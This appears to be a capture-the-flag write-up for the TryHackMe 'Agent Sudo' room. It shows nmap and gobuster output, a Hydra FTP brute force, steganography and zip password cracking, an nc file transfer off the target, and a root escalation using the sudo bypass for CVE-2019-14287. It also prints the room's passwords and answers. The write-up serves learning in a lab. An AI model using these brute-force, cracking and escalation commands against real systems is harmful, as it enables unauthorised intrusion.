<p align="center">
  THM : Agent Sudo<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/agentsudoctf<br>
  <img src="https://i.imgur.com/fCY0Ajn.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [FTP bruteforce](#ftp-bruteforce)
- [Steganography](#steganography)
- [Image search](#image-search)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Let's run an agressive [nmap](https://nmap.org/) scan against the target :  
```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-23 08:11 CEST
Nmap scan report for 10.10.212.56
Host is up (0.048s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.55 seconds
```

There is two open ports on the target :  
- port 21 (FTP)
- port 22 (SSH)
- port 80 (HTTP), there is a websiteon the target

**Question : How many open ports ?**  
**Answer : 3**  

## Website enumeration

### Summary

- [Gobuster enumeration](#gobuster-enumeration)
- [Manual enumeration](#manual-enumeration)

### Gobuster enumeration

Let's run [Gobuster](https://github.com/OJ/gobuster) against the target to find useful files and directories on the website :  
```
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.212.56/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2022/10/23 08:21:37 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 277]
Progress: 220518 / 220561 (99.98%)
===============================================================
2022/10/23 08:33:46 Finished
===============================================================
```

Nothing interesting using [Gobuster](https://github.com/OJ/gobuster).

### Manual enumeration

We can enumerate the website manually. Let's take a look at the index page of the website :  
![](https://i.imgur.com/X4lK0aC.jpg)  

Now we know that we have to find a codename and use it as user-agent. To change my user-agent, I use [this](https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher-revived/) 
extension for Mozilla Firefox. So let's try to use `Agent R` as user-agent and refresh the page :  
![](https://i.imgur.com/X4lK0aC.jpg)  

Nothing changes... So let's try with just `R` as user-agent :  
![](https://i.imgur.com/kpytirk.jpg)  

So now, we know that codenames are just letters. But codename `R` does not seems to be valid. So let's try with other letters... I tried with A, B... and when trying with C :  
![](https://i.imgur.com/vh2nNNy.jpg)  

Now, we have a username `chris` and we know he has weak credentials. We can try to bruteforce other services accessible on the target with this username.

**Question : How you redirect yourself to a secret page ?**  
**Answer : user-agent**  

**Question : What is the agent name ?**  
**Answer : chris**  

## FTP bruteforce

Let's try to bruteforce FTP using [Hydra](https://github.com/vanhauser-thc/thc-hydra) with the username `chris` :  
```
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.212.56 ftp
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-23 09:01:58
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344401 login tries (l:1/p:14344401), ~896526 tries per task
[DATA] attacking ftp://10.10.212.56:21/
[21][ftp] host: 10.10.212.56   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-23 09:02:55
```

We successfully bruteforce user `chris` on FTP. Let's log in to the FTP service with the credentials we foudn :  
```
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo$ ftp 10.10.212.56
Connected to 10.10.212.56.
220 (vsFTPd 3.0.3)
Name (10.10.212.56:attacker): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 29  2019 .
drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp>
```

Let's get those files on our machine :  
```
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (88.1140 kB/s)
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 0.04 secs (812.7109 kB/s)
ftp> get cutie.png
local: cutie.png remote: cutie.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.03 secs (976.8710 kB/s)
```

## Steganography

Let's take a look at `To_agentJ.txt` first :  
```
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

Now we know that there is hidden data in the images we downloaded from FTP. Let's use steghide to try to extract data from `cute-alien.jpg` :  
```
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo$ steghide --extract -sf cute-alien.jpg
Entrez la passphrase: 
steghide: impossible d'extraire des donn�es avec cette passphrase!
```

We need a passphrase. We can use [stegseek](https://github.com/RickdeJager/stegseek) to try to bruteforce the passphrase to extract hidden data :  
```
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo$ stegseek cute-alien.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Area51"

[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".
```

We successfully bruteforced the passphare of `cute-alien.jpg` and [stegseek](https://github.com/RickdeJager/stegseek) automatically extracted extracted the hidden data. Let's take a look 
at `cute-alien.jpg.out` :  
```
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo$ cat cute-alien.jpg.out 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

We have the SSH password for user chris !

Now let's take a llok at `cutie.png` file. Since it's a png file, it's not possible to hide data using steghide in it. So we can try to 
use [binwalk](https://github.com/ReFirmLabs/binwalk) to analyze `cutie.png` :  
```
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo$ binwalk cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

There is an hidden Zip file in this image. We can use the `-e` option to extract the data with binwalk :  
```
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo$ cd _cutie.png.extracted/
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo/_cutie.png.extracted$ ls
365  365.zlib  8702.zip  To_agentR.txt
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo/_cutie.png.extracted$ cat To_agentR.txt 
```

The .txt file is empty. Let's try to extract the archive using [7z](https://www.7-zip.org/download.html) :  
```
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo/_cutie.png.extracted$ 7z e 8702.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=fr_FR.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD Ryzen 3 3100 4-Core Processor               (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 14:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 14:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y

                    
Enter password (will not be echoed):
ERROR: Wrong password : To_agentR.txt
                    
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
```

We  need a password to extract the ZIP archive. Let's use john to crack this ZIP file :  
```
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo/_cutie.png.extracted$ zip2john 8702.zip > hash.txt
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo/_cutie.png.extracted$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 SSE4.1 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:01 DONE (2022-10-23 09:33) 0.8403g/s 20652p/s 20652c/s 20652C/s tracey1..280690
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We successfully cracked the ZIP archive password ! Let's extract the file using the password we just found and read the extracted file :  
```
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo/_cutie.png.extracted$ 7z e 8702.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=fr_FR.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD Ryzen 3 3100 4-Core Processor               (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 14:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 14:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

                    
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo/_cutie.png.extracted$ ls
365  365.zlib  8702.zip  hash.txt  To_agentR.txt
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo/_cutie.png.extracted$ cat To_agentR.txt 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

There is a strange message with somethings that seems to be a password, I'm not sure for the moment but we can keep it just in case.  

Now let's connect to SSH as james :  
```
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo$ ssh james@10.10.212.56
james@10.10.212.56's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct 23 07:46:38 UTC 2022

  System load:  0.07              Processes:           98
  Usage of /:   39.9% of 9.78GB   Users logged in:     0
  Memory usage: 24%               IP address for eth0: 10.10.212.56
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

75 packages can be updated.
33 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Oct 23 07:46:27 2022 from 10.14.32.60
```

(Be careful to include the `!` in the password)  

Now let's get the user_flag.txt flag :  
```
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
******************************
james@agent-sudo:~$
```

**Question : FTP password**  
**Answer : crystal**  

**Question : Zip file password**  
**Answer : alien**  

**Question : steg password**  
**Answer : Area51**  

**Question : Who is the other agent (in full name) ?**  
**Answer : james**

**Question : SSH password**  
**Answer : hackerrules!**

## Image search

First, let's try to answer to the question `What is the incident of the photo called ?`. So I downloaded the photo on my computer by 
using `nc -l -p 1234 > Alien_autospy.jpg` on my machine and then `nc -w 3 10.14.32.60 1234 < Alien_autospy.jpg` on the target machine :  
```
attacker@AttackBox:~/Documents/THM/CTF/Agent_Sudo$ ls -la | grep autospy
-rw-r--r--  1 attacker attacker 42189 23 oct.  09:52 Alien_autospy.jpg
```

Now that I have the file on my computer, I can make a reverse image search to find out what informations we can get from this image :  
![](https://i.imgur.com/ASQNefl.jpg)  

Google automatically searched for french words. So I translated "Affaire de Roswell" to english to find more interesting informations :  
![](https://i.imgur.com/a6XnHKi.jpg)  

So we have a partial information here. We know we are searching for "Roswell incident" :  
![](https://i.imgur.com/nsMKgE9.jpg)  

An Alien autopsy is mentionned and it looks like the image found in james home directory is an image from this Alien Autopsy. Let's search for "Alien Autopsy" on Google :  
![](https://i.imgur.com/f7nQ7jd.jpg)  

We have the answer ! 

**Question : What is the incident of the photo called ?**  
**Answer : Roswell Alien Autopsy**  

## Privilege escalation

Now it's time for privilege escalation, if we look at the sudo version, we will see it is outdated :  
```
james@agent-sudo:~$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

Let's search for exploits for this sudo version on [Exploit-DB](https://www.exploit-db.com/) :  
![](https://i.imgur.com/ZApEjUN.jpg)  

This exploit is for sudo version before 1.8.28 so it may work on the target. Let's try it :  
```
james@agent-sudo:~$ sudo -u#-1 /bin/bash
[sudo] password for james: 
root@agent-sudo:~#
```

And we are root ! Let's get the root flag :  
```
root@agent-sudo:~# cd /root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
***************************

By,
DesKel a.k.a Agent R
```

**Question : CVE number for the escalation**  
**Answer : CVE-2019-14287**

## Conclusion

This room was very cool and was very varied. There was some cracking using john, brute-force using hydra, steganography... I found another way to escalate our 
privileges but it is way more complex, [here](https://www.exploit-db.com/exploits/46978) it is. Thanks for this room and thanks for reading my write ups !






